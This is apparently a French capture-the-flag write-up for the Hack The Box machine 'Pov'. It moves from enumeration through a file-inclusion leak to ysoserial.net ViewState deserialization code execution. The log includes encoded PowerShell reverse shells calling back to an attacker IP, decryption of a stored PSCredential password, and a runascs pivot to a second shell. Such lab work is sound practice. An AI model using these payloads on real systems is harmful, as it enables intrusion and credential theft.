| Room                                 | Pov                                     |
| ------------------------------------ | --------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/Pov |
| Sujets                               | Web/Windows                             |
| Active/Retired lors de la résolution | Active                                  |
| Difficulté                           | Medium                                  |

---
### Nmap


```bash
pak@laptop:~$ nmap -p- -A -vv 10.129.39.248
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 20:13 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating Ping Scan at 20:14
Scanning 10.129.39.248 [2 ports]
Completed Ping Scan at 20:14, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:14
Completed Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed
Initiating Connect Scan at 20:14
Scanning 10.129.39.248 [65535 ports]
Discovered open port 80/tcp on 10.129.39.248
Connect Scan Timing: About 20.42% done; ETC: 20:16 (0:02:01 remaining)
Connect Scan Timing: About 48.81% done; ETC: 20:16 (0:01:04 remaining)
Completed Connect Scan at 20:15, 104.45s elapsed (65535 total ports)
Initiating Service scan at 20:15
Scanning 1 service on 10.129.39.248
Completed Service scan at 20:15, 7.08s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.39.248.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 5.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Nmap scan report for 10.129.39.248
Host is up, received syn-ack (0.022s latency).
Scanned at 2024-03-20 20:14:00 CET for 117s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Uniquement du web. C'est pas ce que je préfère... 

Enumération des sous-domaines :

```bash
pak@laptop:~$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.129.39.248 -H "HOST: FUZZ.pov.htb" -fs 12330

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.39.248
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

ceop                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 981ms]
dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 8638ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1212 req/sec :: Duration: [0:05:49] :: Errors: 0 ::
```

Un fuzzing des répertoires sur les différents sous-domaine n'a rien donné, nuclei non plus.

Sur le domaine dev.pov.htb j'ai pu remarquer qu'un cv était téléchargeable : il est possible, en interceptant la requête, de faire une LFI :

![Pasted image 20240320213948](../../../Files/Pasted%20image%2020240320213948.png)

J'ai alors tenté d'inclure divers fichiers, mais rien de probant... J'ai donc cherché si ce type de requête ne permettait pas un exploit, et j'ai vu que ça parlait d'ysoserial.net. 

Je tente de crafter une commande un peu au pif avec les informations que j'ai :

```powershell
PS D:\Tools\ysoserial.net\ysoserial\bin\Release> .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.17:8000" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
YNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D
```

```http
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 1700
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=YNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&file=/web.config
```

Et l'appel est bien reçu, nice !

```bash
pak@laptop:~$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49671
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.5328
Host: 10.10.16.17:8000
Connection: Keep-Alive
```

Le reverse-shell est donc tenté :

```powershell
PS D:\Tools\ysoserial.net\ysoserial\bin\Release> .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershel
l -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA3ACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

Ce qui nous donne :

```http
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 3504
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=1%2BPbl9s9bp9xkASfskocFFwT%2Bx2uLP5EJJnwgqYZyZ0Qv%2B%2BFItH7ey3HD%2Bte2Aic0T0MviUCGOpECysr52pRAxWNmPywQKj%2Br28HYedziAlBOkrXGYPDw975wZNGa3sgk%2BHvCvkQY3J16L%2BQiFUAbaDqYXsSA4ZZ%2BisGnoSNIqv8bp55YDUkjMyVRWqQBfxGPB5AVK2cfviBShraUWlfDsZZpL%2Bln1mouDLbL7qYYBWGkvZw9BWH4IXq4dSQENxlGK4qLI0wNJ9Xx8kPTNsUF1CD54zap%2BllySs5RJYNMQd1YW041Za84oM2r06YpVEcHpa%2FuQl1NIcan6pz3lSzMH%2BbPP0fiaPg2qgs0cGiMSfBtM%2F0AIdJedPJyz3LDQgyEppiZCZz1ebTQuTKiH7RtCudcbbqkQr89gk9fGU3j%2B%2FLugD6RWiE5I8UfywfuYZDl9qELv3aCKEGOw72E9%2FsbCFNh5p2Z2vl8J6trziazjZIfQQMYakOuceLhVY70XIBJblDgcJZBrw5Xuql0iLMTzj80Ba9W529WmZXis28Br%2F6sLonUSr4GBszwsKBtCOmzf2N67ExfyXrR%2Bmc5mpyiYNkDeFdR3MrcjXb0QP2J5ipMMZK4X8zzXNvxIBDjVJvi9taXP%2BzFBQ%2FX4L0OoKYFAGlBHOb4f5U%2BQtCmTgOR%2Bd4KbZhZPvgOQuTXCy%2FiTM0QoQiXDJSkDhuUHnAbyxSNWYB0PzvbPbnYjDjn43pWA63AVcdYFk0f35WUnWkZvzd6i1YJd79WHWOZKct7ZU%2BPOmgZemv6PRwOs%2Bo5NCcvjyZ8rUgg4z9HCBRnlATatMDrjIfyIbMwB5gAZNQnCzTOsJjlY20uJcQrsIUUz1CaTYgLqk6sPrAq0AaHifUVn9IaD81NjFLFlkEUAM%2FxXbKA7G%2BO%2F0M9%2F5o2jPgDvpnMLlCZa3ndvwAQMl9NbL%2FxRGZHOJH8QKDzcuRX3zXm23QOBEjJSh5RSTTsUbnVwSJej37w2sGFXZkDQEDxHVFUHX5b9k9OfgB9a4Xo%2BKG%2FNmOdotbzhPqlHgenu5KFWv3tpwx2dQhU0VFhOkpgUudL5H%2FPjwTe%2FApEYtT07HmGftHBplCETZ1yOtpSX0u9zQu70M%2FZfveVOzzZyIV%2Fxu0aJ%2BrRkPfgGBzTfEgDBIV2hqFvSHOmvvEKHExNsFCJmrzesVb%2FH5ZjoNXBBazaODslfeOt768rn10D77ZpEhEO%2BiozmUBWdq2JEmqDieqpmJyQFHIiNpAsfVsMEccegUjBPctUYmqeeZxGEeUym3HsycgvHpph3rtWsu9f3ZqKaS8ZiEvC%2Bg2gpKoOFPKdfyv4S4duriT6W%2F1SbhSIK7qpnwRf0NUZj4XR%2F80zMs1zVWvjlbRY%2F8O2X8ZkfFyhbuxhdnX8GLKp2ZdCu7X16Q10DAdE1t8npOApDO1Dmbv3LFkU3EgBZVPTKQkHHdo4kZd8OdkWYXQQ%2B3lyNEsHGGONjyZxQEytTiMJhWmNmQKuCY6GuNjqcNBQGnYg%2FHr6J9O98asmkUW42G7ZQN%2BNCiaCI3lztNx9bPZM0zmXdryVt54otYGYs4heWvc9rGQ2Vfze0o3oZx9lXTH8eNt8MYltaktHELhvnwmvW%2FwhrbpvgDLrJ36EJDcVXOz1Z4daoThuAfQX2ajCM7u2ymtCekAgBMhSOlvSivJ8CQBC8wrz88Au1OaTdfZKoontyLa5nwAXCdWYhWsMH2MXbUnPHEu5cs63Gt1uoLGv5MjXZVM3uAGQHhdki3s7KvRdgIQl2NFVRX%2FO5lEWUdQRozUXLHzqvTFuL2oRsgaFxaapE3%2ByVWbWPhnCcL0aEsMKGqroof7K1RwdZwglxmGuBAM95AIOyM9sJdTSYXdvp4SlkCac8CqgUAGw%2Bf1ji%2FJgs7r1nunvLSli2smOjytIGG5%2BxuEeAYppwB2FADP2U1UHmqF3sTPYJeenxX4G6O%2FUiPdThJDCEX0KIe0JDJLkITD5siuDSqga8BVPYQTbSKfSs9205dR5lCYAxJYoDfRLEs11A04OyhHHhPPJLOJxRtD8m1kZAzWpgxuALhB7gz2E%2BteE%2F3IAJuHgilGFOHSetdYKNbfUZf4G2VXPLBMWo0Y0ugD4h7aumBv%2FgBpFClgRzKBTqxjh%2FA%2BARv2pSANWe42jb%2B8fOXsrnHlAumkVEyOWVe3mQ0gRPoAx7ak7gFDK2dbU7qChvteISumQfoGCOaA5jxD02tXI%2FV4cDVqUTZzKypOkBMF6LKsqP2nVX9Heeet9XI8OPmLiodDaEfQzcLDMhBXsKWT4wfbT4T%2Bn0swAZcbePzTj22XZdxGkEWe56r00EsuDF7wmBP5uHPISIyPjXTsHoUUI3H1Yx1R7hWtguv2rmIVKSmZYgk4e6HpCiAF2sh9OlA96LO0NKFSGai5dej8UzR43h1rN5eGIE4nU9RIYkLbne9B8MWlX0ejotApHerSt1coNiInSZqoHAl2WXypxNAgguu6U7XEmVij5umBjJ7QKYtsgr6wxDfbXeLCxirgzW1ZRlvrf6Cr6zpDgtIkOYXTVSG1%2BM0197j6wPqzGqCxQ6JI4Cqjq9E2EM4M%2FnvtQiF1rNZTRhaOXebaOnXe2CjoJKdDaI%2BmxBOCliVqAPf%2Bvrv9ywz7nuMVfdHg3cde3MgBb2MOG5u7AdOm5uDe83aaSbDb6yIBUR%2BSkHCVj81eqUaVTe%2Fwhu7p8KcoHJpq8apvCDIIzRuupjdQt3BG%2FQC6XG4PkGHFkPDIGYRC%2Fu8bD4gxygy1487sc08nDV%2FyyhEr0FQ3Hyurxnmg1rLuCmwYSAeh9gp4tOAJEQWJIpP38lg6S4XbrDOjA6GkUjHD%2BKEk2nlfAqksZN70eW3kF399EPLTbssv2vv6LmfJ7eXzW2vTXYhCSPWi9PDond8hQda0yGU%2BQs%2FsjHQ4yCPnEEwokBp6FVJ5Kd7aOSxPviKQffzRLbP0m93EBv3xxXx4WXeqzByW53dSTEHX8QkC9HvfmJLl7FXVVuUpV9JjsXtLKo5IUXF%2FzsEjvVwER%2BHs2969lgQQ7TZdGSFOUxYHVuRfzSydiw%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&file=/web.config
```

Et le reverse shell est reçu :

```powershell
pak@laptop:~$ nc -lnvp 8001
listening on [any] 8001 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49674
dir


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/10/2024   6:44 AM                Config
d-----       10/26/2023   4:30 PM                en
d-----       10/26/2023   4:30 PM                en-US
-a----       10/26/2023   2:48 PM         119808 appcmd.exe
-a----        9/15/2018  12:14 AM           3810 appcmd.xml
-a----       10/26/2023   4:30 PM         181760 AppHostNavigators.dll
-a----       10/26/2023   4:30 PM          80896 apphostsvc.dll
-a----       10/26/2023   2:48 PM         406016 appobj.dll
-a----       10/26/2023   4:29 PM         131072 aspnetca.exe
-a----       10/26/2023   2:53 PM          39936 authanon.dll
-a----       10/26/2023   2:53 PM          38400 authbas.dll
-a----       10/26/2023   2:48 PM          24064 cachfile.dll
-a----       10/26/2023   4:30 PM          53248 cachhttp.dll
-a----       10/26/2023   2:53 PM          16896 cachtokn.dll
-a----       10/26/2023   2:48 PM          14336 cachuri.dll
-a----       10/26/2023   4:30 PM          54784 compstat.dll
-a----       10/26/2023   4:30 PM          47104 custerr.dll
-a----       10/26/2023   4:29 PM          20480 defdoc.dll
-a----       10/26/2023   4:29 PM          24064 dirlist.dll
-a----       10/26/2023   4:31 PM          68096 filter.dll
-a----       10/26/2023   4:30 PM          38400 gzip.dll
-a----       10/26/2023   4:29 PM          22016 httpmib.dll
-a----       10/26/2023   2:48 PM          18432 hwebcore.dll
-a----       10/26/2023   2:48 PM          63105 iis.msc
-a----       10/26/2023   2:53 PM         307200 iiscore.dll
-a----       10/26/2023   4:29 PM         110080 iisreg.dll
-a----       10/26/2023   2:48 PM         231936 iisres.dll
-a----       10/26/2023   4:29 PM          38400 iisrstas.exe
-a----       10/26/2023   2:48 PM         192512 iissetup.exe
-a----       10/26/2023   2:48 PM          57344 iissyspr.dll
-a----       10/26/2023   4:29 PM          14848 iisual.exe
-a----       10/26/2023   2:52 PM         285696 iisutil.dll
-a----       10/26/2023   4:30 PM         614912 iisw3adm.dll
-a----       10/26/2023   2:52 PM         125440 InetMgr.exe
-a----       10/26/2023   2:53 PM         131072 isapi.dll
-a----       10/26/2023   4:30 PM          36352 loghttp.dll
-a----       10/26/2023   4:30 PM         147456 Microsoft.Web.Administration.dll
-a----       10/26/2023   4:30 PM        1052672 Microsoft.Web.Management.dll
-a----       10/26/2023   4:29 PM          44032 modrqflt.dll
-a----       10/26/2023   2:52 PM         478720 nativerd.dll
-a----       10/26/2023   4:30 PM          27136 protsup.dll
-a----        1/11/2024   6:51 AM          21504 redirect.dll
-a----       10/26/2023   2:48 PM          33792 rsca.dll
-a----       10/26/2023   2:48 PM          51200 rscaext.dll
-a----       10/26/2023   4:29 PM          40448 static.dll
-a----       10/26/2023   4:29 PM         189952 uihelper.dll
-a----       10/26/2023   4:31 PM          21504 validcfg.dll
-a----       10/26/2023   2:48 PM          16384 w3ctrlps.dll
-a----       10/26/2023   4:29 PM          29696 w3ctrs.dll
-a----       10/26/2023   2:48 PM         109568 w3dt.dll
-a----       10/26/2023   4:30 PM         101888 w3logsvc.dll
-a----       10/26/2023   4:30 PM          29184 w3tp.dll
-a----       10/26/2023   4:30 PM          26624 w3wp.exe
-a----       10/26/2023   4:30 PM          78336 w3wphost.dll
-a----       10/26/2023   4:30 PM          31744 wbhstipm.dll
-a----       10/26/2023   4:30 PM          27648 wbhst_pm.dll
-a----       10/26/2023   4:30 PM         169984 XPath.dll


PS C:\windows\system32\inetsrv>
```

```powershell
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name SID
========= =============================================
pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

En cherchant dans le dossier de l'utilisateur je trouve un .xml contenant potentiellement des creds. L'utilisation d'import-clixml permet alors de déchiffrer le mot de passe de l'utilisateur alaading :

```powershell
PS C:\Users\sfitz> dir Documents


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/25/2023   2:26 PM           1838 connection.xml


PS C:\Users\sfitz> type Documents\connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
PS C:\Users\sfitz> $cred = Import-CliXml -Path Documents\connection.xml; $cred.GetNetworkCredential() | Format-List *


UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString
Domain         :
```

Utilisation de runascs pour lancer un autre reverse-shell :

```powershell
PS C:\Users\sfitz\Downloads> .\runascs.exe alaading f8gQ8fynP44ek1m3 -r 10.10.16.17:4444
[-] Not enough arguments. 3 Arguments required. Use --help for additional help.
PS C:\Users\sfitz\Downloads> .\runascs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.17:4444

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-27216e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4456 created in background.
```

```powershell
pak@laptop:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49678
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
pov\alaading
